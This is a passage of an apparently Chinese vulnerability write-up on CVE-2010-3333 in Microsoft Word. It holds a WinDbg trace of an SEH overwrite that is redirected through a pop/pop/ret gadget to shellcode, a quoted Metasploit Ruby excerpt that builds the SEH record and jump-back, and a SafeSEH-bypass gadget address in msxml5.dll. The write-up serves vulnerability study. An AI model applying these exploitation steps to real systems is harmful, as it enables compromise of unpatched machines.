class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123410</span>=0012ffb0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923288 <span class="built_in">esp</span>=<span class="number">00123400</span> <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x6</span>:</span><br><span class="line">7c923288 <span class="number">52</span>              <span class="keyword">push</span>    <span class="built_in">edx</span> &lt;---- ERR-&gt;Handler</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923289 <span class="built_in">esp</span>=001233fc <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x7</span>:</span><br><span class="line">7c923289 64ff3500000000  <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]     <span class="built_in">fs</span>:003b:<span class="number">00000000</span>=0012ffb0 &lt;---- ERR-&gt;Next</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923290 <span class="built_in">esp</span>=001233f8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0xe</span>:</span><br><span class="line">7c923290 <span class="number">64892500000000</span>  <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">esp</span> <span class="built_in">fs</span>:003b:<span class="number">00000000</span>=0012ffb0 &lt;---- 当前SEH链表头部</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923297 <span class="built_in">esp</span>=001233f8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x15</span>:</span><br><span class="line">7c923297 ff7514          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">14h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123418</span>=001234a0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001233f8  0012ffb0 7c9232bc 0012ffb0 001234b4</span><br><span class="line"><span class="number">00123408</span>  7c92327a 001234cc 0012ffb0 001234e8</span><br><span class="line"><span class="number">00123418</span>  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line"><span class="number">00123428</span>  0012ffb0 7c94a9ef 001234cc 0012ffb0</span><br><span class="line"><span class="number">00123438</span>  001234e8 001234a0 30001bdd <span class="number">00130000</span></span><br><span class="line"><span class="number">00123448</span>  001234cc 1104c830 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123458</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123468</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 001233f8</span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0x0012ffb0</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x7c9232bc</span>     _EXCEPTION_DISPOSITION  ntdll!ExecuteHandler2+<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92329a <span class="built_in">esp</span>=001233f4 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x18</span>:</span><br><span class="line">7c92329a ff7510          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">10h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123414</span>=001234e8</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92329d <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x1b</span>:</span><br><span class="line">7c92329d ff750c          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123410</span>=0012ffb0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c9232a0 <span class="built_in">esp</span>=001233ec <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x1e</span>:</span><br><span class="line">7c9232a0 ff7508          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]    <span class="built_in">ss</span>:<span class="number">0023</span>:0012340c=001234cc</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c9232a3 <span class="built_in">esp</span>=001233e8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x21</span>:</span><br><span class="line">7c9232a3 8b4d18          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">18h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:0012341c=30001bdd</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line">Breakpoint <span class="number">5</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=30001bdd <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c9232a6 <span class="built_in">esp</span>=001233e8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x24</span>:</span><br><span class="line">7c9232a6 ffd1            <span class="keyword">call</span>    <span class="built_in">ecx</span> &#123;WINWORD+<span class="number">0x1bdd</span> (30001bdd)&#125;</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001233e8  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line">001233f8  0012ffb0 7c9232bc 0012ffb0 001234b4</span><br><span class="line"><span class="number">00123408</span>  7c92327a 001234cc 0012ffb0 001234e8</span><br><span class="line"><span class="number">00123418</span>  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line"><span class="number">00123428</span>  0012ffb0 7c94a9ef 001234cc 0012ffb0</span><br><span class="line"><span class="number">00123438</span>  001234e8 001234a0 30001bdd <span class="number">00130000</span></span><br><span class="line"><span class="number">00123448</span>  001234cc 1104c830 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123458</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_RECORD 001234cc</span><br><span class="line">ntdll!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : 0n-<span class="number">1073741819</span> &lt;---- <span class="number">16</span>进制补码(C0000005),EXCEPTION_INVALID_VIOLATION,读写内存违规</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : (null) </span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : <span class="number">0x30ed442c</span> Void &lt;---- 发生异常的指令地址</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 0012ffb0</span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0xa29706eb</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x30001bdd</span>     _EXCEPTION_DISPOSITION  +<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _CONTEXT 001234e8 </span><br><span class="line">ntdll!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : <span class="number">0x1003f</span></span><br><span class="line">   +<span class="number">0x004</span> <span class="built_in">Dr0</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> <span class="built_in">Dr1</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> <span class="built_in">Dr2</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x010</span> <span class="built_in">Dr3</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x014</span> Dr6              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x018</span> Dr7              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x090</span> SegFs            : <span class="number">0x3b</span></span><br><span class="line">   +<span class="number">0x094</span> SegEs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x098</span> SegDs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x09c</span> <span class="built_in">Edi</span>              : <span class="number">0x130000</span></span><br><span class="line">   +<span class="number">0x0a0</span> <span class="built_in">Esi</span>              : <span class="number">0x1104c830</span></span><br><span class="line">   +<span class="number">0x0a4</span> <span class="built_in">Ebx</span>              : <span class="number">0x5000000</span></span><br><span class="line">   +<span class="number">0x0a8</span> <span class="built_in">Edx</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ac</span> <span class="built_in">Ecx</span>              : <span class="number">0x22</span></span><br><span class="line">   +<span class="number">0x0b0</span> <span class="built_in">Eax</span>              : <span class="number">0xc8ac</span></span><br><span class="line">   +<span class="number">0x0b4</span> <span class="built_in">Ebp</span>              : <span class="number">0x1237ec</span></span><br><span class="line">   +<span class="number">0x0b8</span> <span class="built_in">Eip</span>              : <span class="number">0x30ed442c</span></span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : <span class="number">0x1b</span></span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : <span class="number">0x10206</span></span><br><span class="line">   +<span class="number">0x0c4</span> <span class="built_in">Esp</span>              : <span class="number">0x1237b4</span></span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>]  <span class="string">"???"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line">Breakpoint <span class="number">6</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=30001bdd <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bdd <span class="built_in">esp</span>=001233e4 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bdd</span>:</span><br><span class="line">30001bdd <span class="number">59</span>              <span class="keyword">pop</span>     <span class="built_in">ecx</span> &lt;---- 弹出异常处理函数返回地址</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001233e4  7c9232a8 001234cc 0012ffb0 001234e8</span><br><span class="line">001233f4  001234a0 0012ffb0 7c9232bc 0012ffb0</span><br><span class="line"><span class="number">00123404</span>  001234b4 7c92327a 001234cc 0012ffb0</span><br><span class="line"><span class="number">00123414</span>  001234e8 001234a0 30001bdd <span class="number">00130000</span></span><br><span class="line"><span class="number">00123424</span>  001234cc 0012ffb0 7c94a9ef 001234cc</span><br><span class="line"><span class="number">00123434</span>  0012ffb0 001234e8 001234a0 30001bdd</span><br><span class="line"><span class="number">00123444</span>  <span class="number">00130000</span> 001234cc 1104c830 <span class="number">00000000</span></span><br><span class="line"><span class="number">00123454</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=7c9232a8 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bde <span class="built_in">esp</span>=001233e8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bde</span>:</span><br><span class="line">30001bde <span class="number">59</span>              <span class="keyword">pop</span>     <span class="built_in">ecx</span> &lt;---- 弹出第一个参数,_EXCEPTION_RECORD结构体指针</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bdf <span class="built_in">esp</span>=001233ec <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bdf</span>:</span><br><span class="line">30001bdf c3              <span class="keyword">ret</span> &lt;---- 返回到第二个参数(<span class="number">0x0012ffb0</span>,ERR地址),也就是ERR-&gt;Next的内容形成的指令</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=0012ffb0 <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">0012ffb0 eb06            <span class="keyword">jmp</span>     0012ffb8 &lt;---- (<span class="keyword">jmp</span> short,<span class="number">0x0012ffb8</span>-<span class="number">0x0012ffb2</span>=<span class="number">0x06</span>,其<span class="number">16</span>进制补码也为<span class="number">0x06</span>,目的地址与当前指令的下一条指令的地址之差)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 0012ffb0</span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0xa29706eb</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x30001bdd</span>     _EXCEPTION_DISPOSITION  +<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=0012ffb8 <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">0012ffb8 e91f38ffff      <span class="keyword">jmp</span>     001237dc &lt;---- (<span class="keyword">jmp</span> <span class="built_in">near</span>,<span class="number">0x001237dc</span>-<span class="number">0x0012ffbd</span>=-<span class="number">51169</span>,其<span class="number">16</span>进制补码为<span class="number">0xFFFF381F</span>)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=001237dc <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">001237dc b8e69036d6      <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="number">0D63690E6h</span> &lt;---- Shellcode第一条指令</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如上所述，我们已经分析了<code>覆盖SEH记录</code>，以及<code>发生异常</code>后，系统是怎样调用<code>SEH异常处理程序</code>的，还有通过<code>pop/pop/ret</code>形式的<code>ROPGadget</code>跳转到栈上构造的<code>用于跳转到Shellcode的指令</code>去执行，最终跳转到<code>Shellcode</code>执行。</p><p>&emsp;&emsp;<code>此过程</code>可以简化为<code>下图</code>所示：</p><p><img src="/resources/2020/CVE-2010-3333/覆盖SEH劫持控制流示意图.png" alt="覆盖SEH劫持控制流示意图"></p><p>&emsp;&emsp;<code>msf</code>中提供的<code>漏洞利用模块</code>就是使用<code>覆盖SEH记录</code>达成控制流劫持的。其中如下部分，就是<code>关键部分</code>，用于构建上图中的<code>4，5两步骤</code>：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_target</span><span class="params">(rest, targ)</span></span></span><br><span class="line">    targ[<span class="string">'Offsets'</span>].each &#123; <span class="params">|off|</span></span><br><span class="line">        <span class="comment"># Rex::Exploitation::Seh</span></span><br><span class="line">        seh = generate_seh_record(targ.ret) <span class="comment"># 生成SEH记录,"\xeb\x06xxxx",jmp short $+0x06</span></span><br><span class="line">        rest[off, seh.length] = seh</span><br><span class="line">        distance = off + seh.length</span><br><span class="line">        <span class="comment"># jmp near $-,e9xxxxxxxx,SEH记录之后，用于跳转到Shellcode执行的指令</span></span><br><span class="line">        jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, <span class="string">"jmp $-"</span> + distance.to_s).encode_string</span><br><span class="line">        rest[off + seh.length, jmp_back.length] = jmp_back</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><strong><code>环境：</code></strong>Win7&amp;Office2007</p><p>&emsp;&emsp;在<code>Windows7</code>中，已经引入了SEH校验机制<code>SafeSEH</code>。所以我们需要在<code>未启用SafeSEH机制</code>的模块中寻找<code>POP/POP/RET</code>形式的<code>ROPGadget</code>，来<code>bypass SafeSEH</code>。通过<code>mona</code>插件，我们可以知道<code>msxml5.dll</code>并未启用<code>SafeSEH机制</code>，而且在其中找到了<code>POP/POP/RET</code>形式的ROPGadget，其位于地址<code>0x78812890</code>处。</p><h3 id="0x43-Office2003和Office2007-Exploit的通用性"><a href="#0x43-Office2003和Office2007-Exploit的通用性" class="headerlink" title="0x43 Office2003和Office2007 Exploit的通用性"></a>0x43 Office2003和Office2007 